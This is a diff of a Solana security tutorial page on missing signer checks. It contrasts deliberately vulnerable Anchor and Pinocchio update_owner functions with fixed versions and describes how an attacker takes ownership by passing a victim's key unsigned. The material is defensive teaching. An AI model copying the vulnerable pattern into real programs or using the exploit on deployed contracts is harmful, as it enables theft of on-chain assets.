+      console.log("\n      PINOCCHIO SIGNER CHECK SUMMARY:");
+      console.log("      ");
+      console.log("      VULNERABLE: No is_signer() check in update_owner");
+      console.log("         -> Accepts any pubkey without verifying signature");
+      console.log("         -> Attacker passes victim's key, takes ownership");
+      console.log("      ");
+      console.log("      SECURE: Explicit is_signer() validation");
+      console.log("         -> if !owner_info.is_signer() { return Err(...) }");
+      console.log("         -> Transaction fails without owner's signature");
+      console.log("      ");
+      console.log("      KEY LESSON (Pinocchio):");
+      console.log("         Always call is_signer() for privileged operations!");
+      console.log("         Unlike Anchor's Signer<'info>, Pinocchio requires manual checks.");
+    });
+  });
+});
+```
+</CodeGroup>
+
+You will see the Pinocchio exploit succeed identically -- the attacker constructs a `TransactionInstruction` with `isSigner: false` for Alice's key, the payer signs, Alice does not, and ownership transfers.
+
+## The fix -- Pinocchio
+
+A single `if` statement is all it takes. We add the `is_signer()` check before any state mutation.
+
+```rust programs/signer-checks/secure/pinocchio/src/lib.rs
+#![no_std]
+
+#[cfg(not(feature = "no-entrypoint"))]
+#[panic_handler]
+fn panic(_info: &core::panic::PanicInfo) -> ! {
+    loop {}
+}
+
+use pinocchio::{
+    entrypoint,
+    AccountView,
+    Address,
+    ProgramResult,
+};
+use solana_program_error::ProgramError;
+
+pub mod state;
+use state::ProgramAccount;
+
+const ID: Address = Address::new_from_array([
+    0xd1, 0x6c, 0x7e, 0x1f, 0x8a, 0xb3, 0x4c, 0x5d,
+    0xe9, 0x2a, 0x1b, 0xf6, 0xc3, 0x7d, 0x4e, 0x8f,
+    0xa5, 0xb6, 0xc7, 0xd8, 0xe9, 0xfa, 0x0b, 0x1c,
+    0x2d, 0x3e, 0x4f, 0x50, 0x61, 0x72, 0x83, 0x02,
+]);
+
+entrypoint!(process_instruction);
+
+pub fn process_instruction(
+    program_id: &Address,
+    accounts: &[AccountView],
+    instruction_data: &[u8],
+) -> ProgramResult {
+    if program_id != &ID {
+        return Err(ProgramError::IncorrectProgramId);
+    }
+
+    match instruction_data.first() {
+        Some(&0) => initialize(accounts),
+        Some(&1) => update_owner(accounts),
+        _ => Err(ProgramError::InvalidInstructionData),
+    }
+}
+
+fn initialize(accounts: &[AccountView]) -> ProgramResult {
+    let [owner_info, program_account_info, _system_program] = accounts else {
+        return Err(ProgramError::NotEnoughAccountKeys);
+    };
+
+    if !owner_info.is_signer() {
+        return Err(ProgramError::MissingRequiredSignature);
+    }
+
+    if !program_account_info.owned_by(&ID) {
+        return Err(ProgramError::InvalidAccountOwner);
+    }
+
+    let mut data = program_account_info.try_borrow_mut()?;
+
+    if data.len() < ProgramAccount::LEN {
+        return Err(ProgramError::AccountDataTooSmall);
+    }
+
+    data[0] = 1;
+    data[1..33].copy_from_slice(owner_info.address().as_ref());
+    data[33..41].fill(0);
+
+    Ok(())
+}
+
+/// SECURE: validates is_signer() before any state mutation
+fn update_owner(accounts: &[AccountView]) -> ProgramResult {
+    let [owner_info, program_account_info, new_owner_info] = accounts else {
+        return Err(ProgramError::NotEnoughAccountKeys);
+    };
+
+    // FIX: require the owner's signature
+    if !owner_info.is_signer() {
+        return Err(ProgramError::MissingRequiredSignature);
+    }
+
+    if !program_account_info.owned_by(&ID) {
+        return Err(ProgramError::InvalidAccountOwner);
+    }
+
+    let mut data = program_account_info.try_borrow_mut()?;
+
+    if data.len() < ProgramAccount::LEN {
+        return Err(ProgramError::AccountDataTooSmall);
+    }
+
+    if data[0] != 1 {
+        return Err(ProgramError::UninitializedAccount);
+    }
+
+    let stored_owner = Address::new_from_array(<[u8; 32]>::try_from(&data[1..33]).unwrap());
+
+    if stored_owner != *owner_info.address() {
+        return Err(ProgramError::InvalidAccountData);
+    }
+
+    data[1..33].copy_from_slice(new_owner_info.address().as_ref());
+
+    Ok(())
+}
+```
+
+The fix is three lines at the top of `update_owner`:
+
+```rust
+if !owner_info.is_signer() {
+    return Err(ProgramError::MissingRequiredSignature);
+}
+```
+
+This check runs before any data read or mutation. If we did not sign with the owner's private key, the transaction is rejected immediately.
+
+## Side-by-side comparison
 
 <Tabs>
-  <Tab title="Anchor - Fix #1: Signer Type">
-    ### Use the Signer Account Type (Recommended)
-
-    ```rust filename="programs/signer-checks/secure/anchor/src/lib.rs"
+  <Tab title="Anchor">
+    <CodeGroup>
+    ```rust Vulnerable
     #[derive(Accounts)]
     pub struct UpdateOwnership<'info> {
-        // FIX: Signer type enforces signature validation
-        pub owner: Signer<'info>,
-
-        #[account(mut, has_one = owner)]
-        pub program_account: Account<'info, ProgramAccount>,
-
-        /// CHECK: New owner being set
-        pub new_owner: UncheckedAccount<'info>,
-    }
-    ```
-
-    <Accordion title="How this prevents the attack">
-      The `Signer` type forces Anchor to verify:
-      1. The account signed the transaction
-      2. The signature is cryptographically valid
-      3. The signature matches the public key
-
-      Now attackers **cannot** pass Alice's key without her actual signature.
-    </Accordion>
-  </Tab>
-
-  <Tab title="Anchor - Fix #2: Constraint">
-    ### Add signer Constraint
-
-    ```rust
-    #[derive(Accounts)]
-    pub struct UpdateOwnership<'info> {
-        // FIX: Explicit signer constraint
-        #[account(signer)]
+        /// CHECK: INTENTIONALLY VULNERABLE - This should be a Signer but isn't!
         pub owner: UncheckedAccount<'info>,
 
-        #[account(mut, has_one = owner)]
+        #[account(
+            mut,
+            has_one = owner,
+            seeds = [b"program-account", owner.key().as_ref()],
+            bump
+        )]
         pub program_account: Account<'info, ProgramAccount>,
 
-        /// CHECK: New owner
+        /// CHECK: This is the new owner being set, no validation needed
         pub new_owner: UncheckedAccount<'info>,
     }
     ```
-  </Tab>
 
-  <Tab title="Anchor - Fix #3: Manual Check">
-    ### Manual Validation in Handler
+    ```rust Secure
+    #[derive(Accounts)]
+    pub struct UpdateOwnership<'info> {
+        pub owner: Signer<'info>,
 
-    ```rust
-    pub fn update_owner(ctx: Context<UpdateOwnership>) -> Result<()> {
-        // FIX: Explicit signer check in instruction logic
-        if !ctx.accounts.owner.is_signer {
-            return Err(ProgramError::MissingRequiredSignature.into());
-        }
+        #[account(
+            mut,
+            has_one = owner,
+            seeds = [b"program-account", owner.key().as_ref()],
+            bump
+        )]
+        pub program_account: Account<'info, ProgramAccount>,
 
-        ctx.accounts.program_account.owner = ctx.accounts.new_owner.key();
-        Ok(())
+        /// CHECK: This is the new owner being set, no validation needed
+        pub new_owner: UncheckedAccount<'info>,
     }
     ```
+    </CodeGroup>
+
+    One type change: `UncheckedAccount<'info>` to `Signer<'info>`. Everything else is identical.
   </Tab>
-
-  <Tab title="Pinocchio - Secure">
-    ### Add is_signer() Check
-
-    ```rust filename="programs/signer-checks/secure/pinocchio/src/lib.rs"
-    fn update_owner(accounts: &[AccountInfo]) -> ProgramResult {
+  <Tab title="Pinocchio">
+    <CodeGroup>
+    ```rust Vulnerable
+    fn update_owner(accounts: &[AccountView]) -> ProgramResult {
         let [owner_info, program_account_info, new_owner_info] = accounts else {
             return Err(ProgramError::NotEnoughAccountKeys);
         };
 
-        // FIX: Validate signer BEFORE accepting the account
+        if !program_account_info.owned_by(&ID) {
+            return Err(ProgramError::InvalidAccountOwner);
+        }
+
+        let mut data = program_account_info.try_borrow_mut()?;
+
+        // ... validation ...
+
+        let stored_owner = Address::new_from_array(<[u8; 32]>::try_from(&data[1..33]).unwrap());
+
+        // Checks data match but NOT signature
+        if stored_owner != *owner_info.address() {
+            return Err(ProgramError::InvalidAccountData);
+        }
+
+        // MISSING: owner_info.is_signer() check
+
+        data[1..33].copy_from_slice(new_owner_info.address().as_ref());
+        Ok(())
+    }
+    ```
+
+    ```rust Secure
+    fn update_owner(accounts: &[AccountView]) -> ProgramResult {
+        let [owner_info, program_account_info, new_owner_info] = accounts else {
+            return Err(ProgramError::NotEnoughAccountKeys);
+        };
+
+        // FIX: check signer first
         if !owner_info.is_signer() {
             return Err(ProgramError::MissingRequiredSignature);
         }
 
-        // Read stored owner
-        let stored_owner = Pubkey::from(/* ... */);
+        if !program_account_info.owned_by(&ID) {
+            return Err(ProgramError::InvalidAccountOwner);
+        }
 
-        // Verify data matches
-        if stored_owner != *owner_info.key() {
+        let mut data = program_account_info.try_borrow_mut()?;
+
+        // ... validation ...
+
+        let stored_owner = Address::new_from_array(<[u8; 32]>::try_from(&data[1..33]).unwrap());
+
+        if stored_owner != *owner_info.address() {
             return Err(ProgramError::InvalidAccountData);
         }
 
-        // Safe to update now
-        data[1..33].copy_from_slice(new_owner_info.key().as_ref());
+        data[1..33].copy_from_slice(new_owner_info.address().as_ref());
         Ok(())
     }
     ```
+    </CodeGroup>
 
-    <Info>
-    **Key Difference:** Anchor handles this automatically with `Signer` type, but Pinocchio requires explicit manual checks. This is the security tradeoff of low-level development.
-    </Info>
+    Three lines added at the top of the function. The `is_signer()` check runs before anything else.
   </Tab>
 </Tabs>
 
-## Framework Comparison
+## Key takeaways
 
-<AccordionGroup>
-  <Accordion title="Anchor: Type-Safe by Default">
-    - Uses `Signer<'info>` type to enforce signature validation
-    - Compiler errors if you try to use account without proper type
-    - Multiple ways to validate: type, constraint, or manual check
-    - **Trade-off:** Slight overhead from type system
-  </Accordion>
+- **Data matching is not authorization.** `has_one` (Anchor) and address comparison (Pinocchio) verify a key *matches* stored data. They do not verify the holder *signed*.
+- **Use `Signer<'info>` in Anchor** for every account that authorizes an action. One type change eliminates this entire vulnerability class.
+- **In Pinocchio, call `is_signer()` before any state mutation.** There is no type system to save you.
+- **`UncheckedAccount` is a code-review red flag.** Treat it as a potential vulnerability until proven otherwise.
+- **Test both directions.** Confirm the exploit succeeds on the vulnerable version and fails on the secure version.
 
-  <Accordion title="Pinocchio: Manual Validation Required">
-    - Requires explicit `is_signer()` calls
-    - Easy to forget (common source of bugs)
-    - More verbose but complete control
-    - **Trade-off:** Better performance, more dangerous
-  </Accordion>
-</AccordionGroup>
+## Run it yourself
 
-## Testing the Fix
+<Steps>
+  <Step title="Clone the repository">
+    ```bash
+    git clone https://github.com/danielAsaboro/solana_badger.git
+    cd solana_badger
+    ```
+  </Step>
+  <Step title="Install dependencies">
+    ```bash
+    npm install
+    ```
 
-<CodeGroup>
-```typescript Test: Exploit Blocked
-it("should prevent attacker from stealing ownership", async () => {
-  // Alice creates her account
-  await program.methods.initialize()
-    .accounts({ owner: alice.publicKey })
-    .signers([alice])
-    .rpc();
+    You will see the usual `node_modules` tree installed.
+  </Step>
+  <Step title="Build the Anchor programs">
+    ```bash
+    anchor build
+    ```
 
-  // Attacker attempts to steal WITHOUT Alice's signature
-  try {
-    await program.methods.updateOwner()
-      .accounts({
-        owner: alice.publicKey,
-        newOwner: attacker.publicKey,
-      })
-      .signers([attacker])  // Missing Alice's signature
-      .rpc();
+    You will see `BPF SDK` compilation output ending with "To deploy this program" messages for each program.
+  </Step>
+  <Step title="Run the Anchor signer-checks tests">
+    ```bash
+    anchor test -- --grep "Missing Signer Checks"
+    ```
 
-    assert.fail("Expected transaction to fail");
-  } catch (err) {
-    // FIX CONFIRMED: Transaction rejected due to missing signature
-    expect(err.toString()).toContain("missing required signature");
-  }
-});
-```
+    You will see three passing tests: the exploit succeeding against the vulnerable program, the exploit failing against the secure program, and the summary.
+  </Step>
+  <Step title="Run the Pinocchio signer-checks tests">
+    ```bash
+    npx ts-mocha -p ./tsconfig.json -t 1000000 tests/pinocchio/signer-checks.pinocchio.test.ts
+    ```
 
-```bash Expected Output
-✓ should prevent attacker from stealing ownership (187ms)
-
-✅ FIX CONFIRMED: Exploit blocked by signature validation
-```
-</CodeGroup>
-
-## Security Checklist
+    You will see the same pattern: the vulnerable Pinocchio program allows the attack, and the secure version rejects it with a `MissingRequiredSignature` error.
+  </Step>
+</Steps>
 
 <Note>
-Use this checklist when reviewing Solana programs for signer validation:
+The full source for both vulnerable and secure implementations lives at
+[`programs/signer-checks/`](https://github.com/danielAsaboro/solana_badger/tree/main/programs/signer-checks) in the repository.
 </Note>
-
-- [ ] All accounts that authorize actions use `Signer` type (Anchor)
-- [ ] Or all critical accounts have `is_signer()` checks (Pinocchio)
-- [ ] No `UncheckedAccount` types for authority figures
-- [ ] Tests demonstrate that unsigned transactions fail
-- [ ] Code review confirms signature validation happens before state changes
-
-## Resources & Next Steps
-
-<CardGroup cols={3}>
-  <Card title="View Source Code" icon="code" href="https://github.com/superteamng/solana-security-reference/tree/main/programs/signer-checks">
-    Browse the complete vulnerable and secure implementations
-  </Card>
-  <Card title="Run Tests" icon="flask" href="https://github.com/superteamng/solana-security-reference/tree/main/tests">
-    See the exploit and fix demonstrated in automated tests
-  </Card>
-  <Card title="Next: Owner Checks" icon="arrow-right" href="/vulnerabilities/owner-checks">
-    Learn about another critical validation vulnerability
-  </Card>
-</CardGroup>
-
-<Tip>
-Want to practice? Fork the repository and try breaking/fixing the code yourself!
-</Tip>
